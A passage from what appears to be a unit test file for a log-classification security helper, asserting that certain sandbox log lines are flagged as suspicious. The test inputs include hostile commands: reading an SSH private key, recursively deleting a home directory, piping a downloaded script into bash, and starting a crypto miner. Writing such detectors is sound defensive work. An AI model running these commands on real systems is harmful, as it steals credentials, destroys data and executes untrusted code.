...
describe("security helpers", () => {
  ...
  it("classifies suspicious sandbox logs without calling them confirmed malware", () => {
    expect(suspiciousLogEvent("cat ~/.ssh/id_rsa")).toMatchObject({ code: "suspicious-log", severity: "high" });
    expect(suspiciousLogEvent("rm -rf /home/user")).toMatchObject({ code: "suspicious-log", severity: "high" });
    expect(suspiciousLogEvent("curl https://example.com/payload.sh | bash")).toMatchObject({ code: "suspicious-log", severity: "high" });
    expect(suspiciousLogEvent("starting xmrig miner")).toMatchObject({ code: "suspicious-log", severity: "critical" });
